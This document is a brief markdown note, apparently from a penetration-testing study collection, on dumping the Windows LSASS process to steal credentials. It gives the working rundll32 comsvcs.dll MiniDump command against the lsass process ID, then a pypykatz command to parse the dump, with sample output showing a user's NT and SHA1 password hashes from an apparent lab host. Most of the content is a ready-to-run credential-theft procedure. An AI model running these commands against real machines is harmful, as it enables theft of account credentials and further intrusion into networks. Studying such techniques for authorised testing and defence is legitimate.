# Attacking LSASS

Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- Enforce security policies
- Write to Windows' [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

## Dumping from Task Manager

![[Pasted image 20260103101738.png]]

## Dumping with Rundll32 & Comsvcs.dll

```powershell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

## Extract creds with Pypykatz

```bash
❯ pypykatz lsa minidump lsass.dmp
```

```bash
== LogonSession ==
authentication_id 124054 (1e496)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2026-01-03T03:06:56.952372+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 124054
	== MSV ==
		Username: Vendor
		Domain: FS01
		LM: NA
		NT: 31f87811133bc6aaa75a536e77f64314
		SHA1: 2b1c560c35923a8936263770a047764d0422caba
		DPAPI: 0000000000000000000000000000000000000000
	== WDIGEST [1e496]==
		username Vendor
		domainname FS01
		password None
		password (hex)
	== Kerberos ==
		Username: Vendor
		Domain: FS01
	== WDIGEST [1e496]==
		username Vendor
		domainname FS01
		password None
		password (hex)
```

